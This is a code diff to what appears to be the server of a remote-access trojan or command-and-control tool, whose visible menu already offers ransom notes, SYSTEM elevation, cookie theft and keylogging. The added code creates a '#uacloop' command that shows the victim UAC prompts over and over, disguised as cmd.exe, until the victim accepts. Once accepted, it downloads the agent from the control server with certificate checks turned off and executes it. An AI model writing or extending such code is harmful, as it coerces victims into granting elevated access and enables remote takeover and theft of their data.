@@ -246,6 +246,7 @@ def init_socket_handlers(socketio):
                         "  #clearransom       - Closes ransom note and restarts explorer.exe\r\n"
                         "  #getsystem         - Elevate to NT AUTHORITY\\SYSTEM (Requires Admin)\r\n"
                         "  #spawnas <user>    - Spawn agent as specified user (Requires SYSTEM/Admin)\r\n"
+                        "  #uacloop           - Infinite UAC prompt until user accepts to spawn elevated agent\r\n"
                     )
                     emit('terminal_output', {
                         'agent_id': agent_id,
@@ -526,6 +527,44 @@ else:
                         }, room=f"terminal_{agent_id}")
                         conn.close()
                         return
+                elif cmd_type == 'uacloop':
+                    c.execute("SELECT server_url FROM agent_configurations ORDER BY timestamp DESC LIMIT 1")
+                    row = c.fetchone()
+                    server_url = row[0].rstrip('/') if row else request.url_root.rstrip('/')
+                    
+                    task_type = 'execute_python'
+                    python_payload = f"""
+import os, sys, ctypes, threading, time
+
+def uac_loop():
+    server_url = {repr(server_url)}
+    # One-liner to spawn agent
+    agent_cmd = f"import urllib3;urllib3.disable_warnings();import requests;exec(requests.get('{{server_url}}/a/d',verify=False).text)"
+    
+    # Path to pythonw.exe
+    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+    if not os.path.exists(pyw): pyw = sys.executable
+    
+    # We trigger UAC on cmd.exe to make it look legitimate
+    # params: /c "path\to\pythonw.exe" -c "agent_code"
+    params = f'/c ""{{pyw}}" -c "{{agent_cmd}}""'
+    
+    while True:
+        # Trigger UAC on cmd.exe (Windows Command Processor)
+        # 0 = SW_HIDE
+        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", params, None, 0)
+        if int(ret) > 32:
+            break
+        elif int(ret) == 5:
+            time.sleep(0.5)
+            continue
+        else:
+            break
+
+threading.Thread(target=uac_loop, daemon=True).start()
+result = "UAC loop started using cmd.exe (masquerading as Windows Command Processor)"
+"""
+                    task_data = {'code': python_payload.strip()}
                 elif cmd_type == 'cookies':
                     task_type = 'steal_cookies'
                 elif cmd_type == 'keylogger':
